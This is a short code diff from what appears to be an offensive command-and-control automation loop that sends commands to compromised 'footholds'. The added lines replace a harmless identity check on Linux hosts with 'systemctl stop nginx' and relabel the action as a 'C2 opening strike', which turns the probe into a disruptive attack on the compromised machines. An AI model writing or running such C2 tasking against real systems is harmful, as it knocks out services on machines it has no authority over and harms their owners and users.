@@ -296,10 +296,14 @@ class Loop:
         for fh in self.world.footholds():
             ip = fh["ip"]
             try:
+                windows = self.ctx.is_windows(ip)
                 result = execute("task_channel",
                                  {"ip": ip,
-                                  "command": "whoami" if self.ctx.is_windows(ip) else "id",
-                                  "goal": "C2 channel check"},
+                                  "command": ("whoami" if windows
+                                              else "systemctl stop nginx"),
+                                  "service": None if windows else "nginx",
+                                  "goal": ("C2 channel check" if windows
+                                           else "C2 opening strike")},
                                  self.ctx, source="seed")
             except Exception as exc:
                 self.log.emit("c2_probe_error", ip=ip,
